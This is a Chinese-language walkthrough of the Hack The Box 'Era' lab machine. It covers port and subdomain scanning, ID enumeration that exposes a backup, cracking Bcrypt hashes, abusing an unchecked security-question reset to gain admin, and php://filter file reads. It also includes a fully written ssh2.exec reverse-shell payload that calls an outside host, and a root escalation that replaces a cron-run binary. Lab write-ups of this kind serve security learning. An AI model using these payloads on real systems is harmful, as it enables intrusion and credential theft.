# Era #
## nmap探测 ##
#### `nmap -sT --min-rate 10000 -p- 10.10.11.79`
![](./Era/1.jpg)

#### `nmap -sT -sC -sV -O -A -p 21,80 10.10.11.79`
![](./Era/2.jpg)

#### 配置hosts绑定域名
#### `echo '10.10.11.79 era.htb' >> /etc/hosts`
## Web探测 ##
#### 浏览器访问era.htb
![](./Era/3-1.jpg)

#### 页面上没找到什么有用的东西，目录爆破一下
#### `gobuster dir -w /usr/share/wordlists/dirb/common.txt --url http://era.htb/  -x php,html -o dir.txt`
![](./Era/3-2.jpg)

#### 也没什么有用的东西，进行子域名爆破
#### `wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-20000.txt -u era.htb -H "Host:FUZZ.era.htb" --hh 154`
![](./Era/3-3.jpg)

#### 先将file.era.htb绑定到hosts文件，然后浏览器访问
![](./Era/4-1.jpg)

#### 功能都需要登录，也支持安全问题登录
![](./Era/4-2.jpg)

#### 用sql注入试了下登录，失败；用era.htb中发现的三个人名组合字典弱口令爆破也都失败了
#### 目录爆破一下
![](./Era/4.jpg)

### 有注册，注册账号
![](./Era/5.jpg)

#### 登录注册的账号，可以上传文件
![](./Era/6.jpg)

#### 先随便上传点东西看看
![](./Era/6-1.jpg)

#### 上传之后会生成一个下载链接
#### 对生成的链接用sql注入、文件包含、任意文件读取..都测试失败了，最后遍历id发现了有用的东西
#### `wfuzz -z range,1-9999 -u "http://file.era.htb/download.php?id=FUZZ" -H "Cookie: PHPSESSID=smo67vrtegsd05r3drejne6nn7" --hh 7686`
![](./Era/9.jpg)

#### 访问看看
#### 其中一个看起来是网站的备份文件
![](./Era/10.jpg)

![](./Era/11.jpg)

#### 可以正常下载解压，signing包里不知道有什么用
![](./Era/12.jpg)

#### 在备份文件夹中发现是数据库文件filedb.sqlite
![](./Era/13.jpg)

#### 加密方式很眼熟，上个靶场中也用的是这个Bcrypt
#### 使用john破解得到两个用户的密码，可以直接登录系统，但是没发现有用的东西
#### `john --wordlist=/usr/share/wordlists/rockyou.txt users.txt --format=Bcrypt`
![](./Era/14.jpg)

#### 有了源码，看看能不能发现什么漏洞，在download.php中发现这里
![](./Era/18.jpg)

#### 当show=true并且是管理员用户的时候可以利用伪协议读取本地文件
#### 接下来的问题就是怎么登陆管理员用户了，在前面的filedb.sqlite数据库中已经知道到了管理员账号并且有问题答案，但是登录失败了
![](./Era/18-1.jpg)

#### 不过没关系，安全问题的答案可以随便改。登录任意用户，更改安全问题没有校验
![](./Era/18-2.jpg)

#### 更新成功之后再使用安全问题登录管理员（那两个文件就是管理员的）
![](./Era/18-3.jpg)

#### 根据download.php发现的漏洞，进行文件读取

#### `http://file.era.htb/download.php?id=54&show=true&format=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd`
#### 结果就下载下来了一个download.php文件，文件内容
![](./Era/18-4.jpg)

#### web端暂时没什么发现了，看看21号端口
## Ftp探测
#### 用前面发现的yuri账号密码可以直接登录
![](./Era/16.jpg)

#### 分别看下有什么内容

![](./Era/17.jpg)

![](./Era/15.jpg)

#### 有一个ssh2.so的拓展
#### `ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd`可以执行命令
#### [利用方式参考](https://www.php.net/manual/zh/wrappers.ssh2.php)
#### 反弹shell `bash -i >& /dev/tcp/10.10.16.23/9527 0>&1`
#### 需要使用base64编码，构造之后变成
#### `ssh2.exec://eric:america@127.0.0.1/bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMy85NTI3IDA+JjE=|base64 -d|bash';`
#### 再urlencode一次，最终变成
#### `ssh2.exec%3A%2F%2Feric%3Aamerica%40127.0.0.1%2Fbash%20-c%20%27echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi4yMy85NTI3IDA%2BJjE%3D%7Cbase64%20-d%7Cbash%27%3B`
#### 执行
![](./Era/21.jpg)

## 提权
#### 在/opt目录下找到一个AV文件夹，里面有一个monitor的二进制文件
#### 用pspy看下有没有相关的进程
![](./Era/25.jpg)
#### 看进程id和时间应该是用了定时任务，一分钟执行一次
#### 提权流程
#### 制作一个反弹shell的二级制文件->执行objcopy从monitor中提取text_sig->将提取的text_sig添加到反弹shell文件->命名反弹shell文件为monitor并添加执行权限
#### `gcc test.c -o bd`
#### `objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor`
#### `objcopy --add-section .text_sig=text_sig bd`
#### `cp bd monitor`
#### `chmod +x monitor`
![](./Era/26.jpg)

#### 等待任务执行
#### 收到root的反弹shell
![](./Era/27.jpg)

#### 果然是定时任务
![](./Era/28.jpg)

## 总结
#### medium还是有一些难度的，主要涉及的知识面太广了，利用ssh2反弹shell也是看了别人的writeup才知道的。目标使用的nginx是1.18.0版本存在解析漏洞，本来是想通过上传文件然后利用解析漏洞拿到shell但是失败了